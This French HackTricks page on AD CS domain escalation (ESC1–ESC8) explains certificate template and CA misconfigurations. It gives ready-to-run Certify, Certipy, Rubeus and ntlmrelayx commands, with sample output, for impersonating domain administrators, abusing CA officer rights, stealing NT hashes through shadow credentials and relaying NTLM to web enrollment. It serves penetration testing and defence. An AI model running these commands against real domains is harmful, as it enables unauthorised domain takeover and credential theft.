# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Voici un résumé des sections consacrées aux techniques d'escalade des articles suivants :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Certificate Templates mal configurés - ESC1

### Explication

### Explication de Misconfigured Certificate Templates - ESC1

- **Des droits d'enrollment sont accordés à des utilisateurs faiblement privilégiés par l'Enterprise CA.**
- **L'approbation d'un responsable n'est pas requise.**
- **Aucune signature de personnel autorisé n'est nécessaire.**
- **Les descripteurs de sécurité des certificate templates sont trop permissifs, ce qui permet aux utilisateurs faiblement privilégiés d'obtenir des droits d'enrollment.**
- **Les certificate templates sont configurés pour définir des EKU qui facilitent l'authentification :**
- Des identifiants Extended Key Usage (EKU) tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou aucun EKU (SubCA) sont inclus.
- **La possibilité pour les demandeurs d'inclure un subjectAltName dans la Certificate Signing Request (CSR) est autorisée par le template :**
- Active Directory (AD) donne la priorité au subjectAltName (SAN) d'un certificat pour la vérification d'identité lorsqu'il est présent. Cela signifie qu'en spécifiant le SAN dans une CSR, il est possible de demander un certificat permettant d'usurper l'identité de n'importe quel utilisateur (par exemple, un administrateur du domaine). La possibilité pour le demandeur de spécifier un SAN est indiquée dans l'objet AD du certificate template via la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits, et la présence du flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet au demandeur de spécifier le SAN.

> [!CAUTION]
> La configuration décrite permet aux utilisateurs faiblement privilégiés de demander des certificats avec n'importe quel SAN de leur choix, permettant ainsi de s'authentifier en tant que n'importe quel principal du domaine via Kerberos ou SChannel.

Cette fonctionnalité est parfois activée pour permettre la génération à la volée de certificats HTTPS ou de certificats d'hôte par des produits ou des services de déploiement, ou par manque de compréhension.

Il est à noter que la création d'un certificat avec cette option déclenche un avertissement, ce qui n'est pas le cas lorsqu'un certificate template existant (tel que le template `WebServer`, qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé) est dupliqué puis modifié pour inclure un OID d'authentification.<sup>[[6]](#references)</sup>

### Exploitation

Pour **trouver les certificate templates vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **exploiter cette vulnérabilité afin d'usurper l'identité d'un administrateur**, on pourrait exécuter :
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Vous pouvez ensuite convertir le **certificat généré au format `.pfx`** et l’utiliser pour vous **authentifier à l’aide de Rubeus ou certipy** à nouveau :<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows « Certreq.exe » et « Certutil.exe » peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L’énumération des certificate templates au sein du schéma de configuration de l’AD Forest, plus précisément ceux ne nécessitant ni approbation ni signature, disposant d’un EKU Client Authentication ou Smart Card Logon et pour lesquels l’indicateur `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d’abus est une variante du premier :

1. Les droits d’inscription sont accordés aux utilisateurs disposant de faibles privilèges par l’Enterprise CA.
2. L’exigence d’approbation du manager est désactivée.
3. La nécessité de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde des droits d’inscription de certificats aux utilisateurs disposant de faibles privilèges.
5. **Le modèle de certificat est défini pour inclure l’EKU Any Purpose ou aucun EKU.**

L’**EKU Any Purpose** permet à un attacker d’obtenir un certificat pour **n’importe quelle utilisation**, notamment l’authentification client, l’authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats **sans EKU**, qui agissent comme des certificats de CA subordinate, peuvent être exploités **pour n’importe quelle utilisation** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attacker pourrait spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat de CA subordinate.

Cependant, les nouveaux certificats créés pour l’**authentification au domaine** ne fonctionneront pas si la CA subordinate n’est pas approuvée par l’objet **`NTAuthCertificates`**, ce qui constitue le paramètre par défaut. Néanmoins, un attacker peut toujours créer de **nouveaux certificats avec n’importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient potentiellement être **abusés** à diverses fins (par exemple, signature de code, authentification serveur, etc.) et avoir des implications importantes pour d’autres applications du réseau, comme SAML, AD FS ou IPSec.<sup>[[6]](#references)</sup>

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de l’AD Forest, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d’Enrollment Agent mal configurés - ESC3

### Explication

Ce scénario est similaire aux deux premiers, mais **abuse** d’un **EKU différent** (Certificate Request Agent) et de **2 modèles différents** (il comporte donc 2 ensembles d’exigences),

Le **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), appelé **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **s’enrôler** pour obtenir un **certificat** **au nom d’un autre utilisateur**.

L’**« enrollment agent »** s’enrôle dans un tel **modèle** et utilise le **certificat obtenu pour co-signer une CSR au nom de l’autre utilisateur**. Il **envoie** ensuite la **CSR co-signée** à la CA, en s’enrôlant dans un **modèle** qui **autorise l’« enroll on behalf of »**, et la CA renvoie un **certificat appartenant à l’« autre » utilisateur**.<sup>[[6]](#references)</sup>

**Exigences 1 :**

- Des droits d’enrollment sont accordés aux utilisateurs faiblement privilégiés par l’Enterprise CA.
- L’exigence d’une approbation du responsable est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif et accorde des droits d’enrollment aux utilisateurs faiblement privilégiés.
- Le modèle de certificat inclut le Certificate Request Agent EKU, permettant de demander d’autres modèles de certificats au nom d’autres principals.

**Exigences 2 :**

- L’Enterprise CA accorde des droits d’enrollment aux utilisateurs faiblement privilégiés.
- L’approbation du responsable est contournée.
- La version du schéma du modèle est soit 1, soit supérieure à 2, et elle spécifie une Application Policy Issuance Requirement nécessitant le Certificate Request Agent EKU.
- Un EKU défini dans le modèle de certificat autorise l’authentification au domaine.
- Aucune restriction pour les enrollment agents n’est appliquée sur la CA.

### Abuse

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour abuser de ce scénario :<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** autorisés à **obtenir** un **certificat d’agent d’inscription**, les modèles dans lesquels les **agents** d’inscription sont autorisés à s’inscrire, ainsi que les **comptes** au nom desquels l’agent d’inscription peut agir, peuvent être restreints par les autorités de certification d’entreprise. Pour cela, ouvrez le **snap-in** `certsrc.msc`, faites un **clic droit sur l’autorité de certification**, cliquez sur **Properties**, puis accédez à l’onglet “Enrollment Agents”.

Cependant, il convient de noter que le paramètre **par défaut** des autorités de certification est “**Do not restrict enrollment agents**”. Lorsque les administrateurs activent la restriction des agents d’inscription en sélectionnant “Restrict enrollment agents”, la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s’inscrire dans tous les modèles en tant que n’importe qui.

## Contrôle d’accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Le **descripteur de sécurité** des **modèles de certificats** définit les **permissions** que des **principals AD** spécifiques possèdent sur le modèle.

Si un **attaquant** possède les **permissions** requises pour **modifier** un **modèle** et **mettre en place** l’une des **mauvaises configurations exploitables** décrites dans les **sections précédentes**, cela peut faciliter une élévation de privilèges.

Les permissions notables applicables aux modèles de certificats incluent :<sup>[[6]](#references)</sup>

- **Owner :** Accorde un contrôle implicite sur l’objet, permettant de modifier n’importe lequel de ses attributs.
- **FullControl :** Accorde une autorité complète sur l’objet, notamment la possibilité de modifier n’importe lequel de ses attributs.
- **WriteOwner :** Permet de modifier le propriétaire de l’objet en faveur d’un principal contrôlé par l’attaquant.
- **WriteDacl :** Permet de modifier les contrôles d’accès, ce qui peut potentiellement accorder le **FullControl** à un attaquant.
- **WriteProperty :** Autorise la modification de n’importe quelle propriété de l’objet.

### Abus

Pour identifier les principals disposant de droits de modification sur les modèles et autres objets PKI, effectuez une énumération avec Certify :
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un exemple de privesc similaire au précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 correspond au cas où un utilisateur dispose de privilèges d’écriture sur un certificate template. Cela peut par exemple être exploité pour écraser la configuration du certificate template afin de rendre le template vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` dispose de ces privilèges, mais notre utilisateur `JOHN` possède la nouvelle relation `AddKeyCredentialLink` vers `JOHNPC`. Comme cette technique est liée aux certificats, j’ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Voici un petit aperçu de la commande `shadow auto` de Certipy permettant de récupérer le NT hash de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d’un certificate template avec une seule commande. Par **défaut**, Certipy **écrasera** la configuration afin de la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le **`-save-old` parameter pour sauvegarder l’ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès vulnérable aux objets PKI - ESC5

### Explication

Le vaste réseau de relations interconnectées basées sur les ACL, qui comprend plusieurs objets au-delà des certificate templates et de la certificate authority, peut affecter la sécurité de l'ensemble du système AD CS. Ces objets, qui peuvent avoir un impact significatif sur la sécurité, comprennent :

- L'objet ordinateur AD du serveur CA, qui peut être compromis par des mécanismes tels que S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout objet AD descendant ou conteneur situé dans le chemin de conteneur spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin comprend notamment des conteneurs et des objets tels que le conteneur Certificate Templates, le conteneur Certification Authorities, l'objet NTAuthCertificates et le Enrollment Services Container.

La sécurité du système PKI peut être compromise si un attaquant disposant de faibles privilèges parvient à prendre le contrôle de l'un de ces composants critiques.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet abordé dans l'[**article de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, comme l'explique Microsoft. Lorsque cette configuration est activée sur une Certification Authority (CA), elle permet d'inclure des **valeurs définies par l'utilisateur** dans le **subject alternative name** pour **toute requête**, y compris celles générées depuis Active Directory®. Cette fonctionnalité permet donc à un **intrus** de s'enregistrer via **n'importe quel template** configuré pour l'**authentication** de domaine, notamment ceux qui autorisent l'enrollment des utilisateurs **non privilégiés**, comme le template User standard. Ainsi, un certificat peut être obtenu, permettant à l'intrus de s'authentifier en tant qu'administrateur de domaine ou **toute autre entité active** au sein du domaine.<sup>[[9]](#references)</sup>

**Remarque** : La méthode permettant d'ajouter des **noms alternatifs** dans une Certificate Signing Request (CSR), via l'argument `-attrib "SAN:"` de `certreq.exe` (appelé « Name Value Pairs »), diffère de la stratégie d'exploitation des SAN dans ESC1. La distinction réside ici dans **la manière dont les informations du compte sont encapsulées** : dans un attribut du certificat, et non dans une extension.

### Exploitation

Pour vérifier si ce paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération utilise essentiellement **l’accès au registre à distance** ; par conséquent, une autre approche pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l’exploiter :<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, à condition de disposer de droits d’**administrateur du domaine** ou équivalents, la commande suivante peut être exécutée depuis n’importe quel poste de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, l’indicateur peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les **certificats** nouvellement émis contiendront une **extension de sécurité** qui intègre la propriété `objectSid` du **requester**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète l’`objectSid` du **requester**, et non le SAN.\
> Pour exploiter ESC6, le système doit impérativement être vulnérable à ESC10 (Weak Certificate Mappings), qui donne la priorité au **SAN** sur la nouvelle extension de sécurité.

## Contrôle d’accès vulnérable de l’autorité de certification - ESC7

### Attack 1

#### Explication

Le contrôle d’accès d’une autorité de certification est géré par un ensemble d’autorisations qui régissent les actions de la CA. Ces autorisations peuvent être consultées en ouvrant `certsrv.msc`, en faisant un clic droit sur une CA, en sélectionnant les propriétés, puis en ouvrant l’onglet Security. De plus, les autorisations peuvent être énumérées à l’aide du module PSPKI avec des commandes telles que :
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Cela fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant respectivement aux rôles d’« administrateur de CA » et de « Certificate Manager ».<sup>[[6]](#references)</sup>

#### Abus

Disposer des droits **`ManageCA`** sur une autorité de certification permet au principal de manipuler les paramètres à distance à l’aide de PSPKI. Cela inclut l’activation du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** afin d’autoriser la spécification du SAN dans n’importe quel template, un aspect essentiel de la domain escalation.

La simplification de ce processus est possible grâce à la cmdlet **Enable-PolicyModuleFlag** de PSPKI, qui permet d’effectuer des modifications sans interaction directe avec l’interface GUI.

La possession des droits **`ManageCertificates`** facilite l’approbation des demandes en attente, contournant ainsi la protection « approbation par le Certificate Manager de la CA ».

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explication

> [!WARNING]
> Lors de l'**attaque précédente**, les permissions **`Manage CA`** ont été utilisées pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'**attaque ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'aura pas été redémarré. Lorsqu'un utilisateur dispose du droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, E**SC6 pourrait ne pas fonctionner directement** dans la plupart des environnements corrigés en raison des mises à jour de sécurité de mai 2022.

Une autre attaque est donc présentée ici.

Prérequis :

- Uniquement la permission **`ManageCA`**
- La permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
- Le certificate template **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

La technique repose sur le fait que les utilisateurs disposant des droits d'accès `Manage CA` _et_ `Manage Certificates` peuvent **émettre des demandes de certificat ayant échoué**. Le certificate template **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'y inscrire. Ainsi, un **utilisateur** peut **demander** une inscription dans **`SubCA`** - ce qui sera **refusé** - mais la demande sera **ensuite émise par le manager**.<sup>[[6]](#references)</sup>

#### Abus

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur comme nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le template **`SubCA`** peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le template `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la clé privée et noterons l’ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` et `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat ayant échoué** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat émis** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attaque 3 – Abuse de l’extension Manage Certificates (SetExtension)

#### Explication

En plus des abus ESC7 classiques (activation des attributs EDITF ou approbation des demandes en attente), **Certify 2.0** a révélé une toute nouvelle primitive qui nécessite uniquement le rôle *Manage Certificates* (aussi appelé **Certificate Manager / Officer**) sur l’Enterprise CA.<sup>[[3]](#references)</sup>

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par tout principal détenant *Manage Certificates*. Alors que cette méthode était traditionnellement utilisée par les CA légitimes pour mettre à jour les extensions des demandes **en attente**, un attaquant peut l’exploiter pour **ajouter une *extension de certificat non par défaut*** (par exemple un OID personnalisé de *Certificate Issuance Policy* tel que `1.1.1.1`) à une demande en attente d’approbation.

Comme le template ciblé ne **définit pas de valeur par défaut pour cette extension**, la CA ne remplacera PAS la valeur contrôlée par l’attaquant lorsque la demande sera finalement émise. Le certificat résultant contient donc une extension choisie par l’attaquant, qui peut :

* Satisfaire aux exigences d’Application / Issuance Policy d’autres templates vulnérables (entraînant une privilege escalation).
* Injecter des EKU ou des policies supplémentaires accordant au certificat une confiance inattendue dans des systèmes tiers.

En résumé, *Manage Certificates* – auparavant considéré comme la moitié « la moins puissante » d’ESC7 – peut désormais être exploité pour une privilege escalation complète ou une persistence à long terme, sans modifier la configuration de la CA ni nécessiter le droit plus restrictif *Manage CA*.

#### Exploitation de la primitive avec Certify 2.0

1. **Soumettre une certificate request qui restera *pending*.** Cela peut être forcé avec un template nécessitant l’approbation d’un manager :
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ajouter une extension personnalisée à la pending request** à l’aide de la nouvelle commande `manage-ca` :
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si le template ne définit pas déjà l’extension *Certificate Issuance Policies*, la valeur ci-dessus sera conservée après l’émission.*

3. **Émettre la request** (si votre rôle dispose également des droits d’approbation *Manage Certificates*) ou attendre qu’un operator l’approuve. Une fois émise, télécharger le certificat :
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Le certificat résultant contient désormais l’OID d’issuance-policy malveillant et peut être utilisé dans des attaques ultérieures (par exemple ESC13, domain escalation, etc.).

> NOTE:  La même attaque peut être exécutée avec Certipy ≥ 4.7 via la commande `ca` et le paramètre `-set-extension`.

## NTLM Relay vers les endpoints HTTP d’AD CS – ESC8

### Explication

> [!TIP]
> Dans les environnements où **AD CS est installé**, s’il existe un **web enrollment endpoint vulnérable** et qu’au moins un **certificate template est publié** et autorise l’enrollment de domain computers ainsi que l’authentification client (comme le template par défaut **`Machine`**), **tout computer dont le service spooler est actif peut être compromis par un attaquant** !

Plusieurs **méthodes d’enrollment basées sur HTTP** sont prises en charge par AD CS et rendues disponibles par des rôles de serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces d’enrollment de certificats basées sur HTTP sont vulnérables aux **NTLM relay attacks**. Depuis une **machine compromise, un attaquant peut usurper l’identité de tout compte AD qui s’authentifie via du NTLM entrant**. En usurpant le compte victime, ces interfaces web peuvent être utilisées par un attaquant pour **demander un certificat d’authentification client à l’aide des certificate templates `User` ou `Machine`**.

- L’**interface web enrollment** (une ancienne application ASP disponible à l’adresse `http://<caserver>/certsrv/`) utilise HTTP uniquement par défaut, ce qui ne fournit aucune protection contre les NTLM relay attacks. De plus, elle autorise explicitement uniquement l’authentification NTLM via son header HTTP Authorization, rendant inapplicables des méthodes d’authentification plus sécurisées comme Kerberos.
- Le **Certificate Enrollment Service** (CES), le **Certificate Enrollment Policy** (CEP) Web Service et le **Network Device Enrollment Service** (NDES) prennent par défaut en charge l’authentification negotiate via leur header HTTP Authorization. L’authentification Negotiate prend en charge à la fois **Kerberos** et **NTLM**, ce qui permet à un attaquant de **rétrograder vers une authentification NTLM** pendant des relay attacks. Bien que ces web services activent HTTPS par défaut, HTTPS seul **ne protège pas contre les NTLM relay attacks**. La protection contre les NTLM relay attacks pour les services HTTPS est uniquement possible lorsque HTTPS est combiné au channel binding. Malheureusement, AD CS n’active pas l’Extended Protection for Authentication sur IIS, ce qui est nécessaire au channel binding.<sup>[[6]](#references)</sup>

Un **problème** courant des NTLM relay attacks est la **courte durée des sessions NTLM** et l’impossibilité pour l’attaquant d’interagir avec des services qui **exigent la signature NTLM**.

Néanmoins, cette limitation peut être contournée en exploitant un NTLM relay attack pour obtenir un certificat pour l’utilisateur, car la période de validité du certificat détermine la durée de la session et le certificat peut être utilisé avec des services qui **exigent la signature NTLM**. Pour savoir comment utiliser un certificat volé, consultez :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des NTLM relay attacks est qu’**une machine contrôlée par l’attaquant doit être authentifiée par un compte victime**. L’attaquant peut soit attendre, soit tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **endpoints HTTP AD CS activés** :<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les Autorités de certification (CAs) d’entreprise pour stocker les endpoints du Certificate Enrollment Service (CES). Ces endpoints peuvent être analysés et listés à l’aide de l’outil **Certutil.exe** :
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

La demande de certificat est effectuée par défaut par Certipy sur la base du template `Machine` ou `User`, selon que le nom du compte relayé se termine ou non par `$`. La spécification d’un autre template peut être effectuée à l’aide du paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour forcer l’authentification. Lorsqu’il s’agit de contrôleurs de domaine, il est nécessaire de spécifier `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

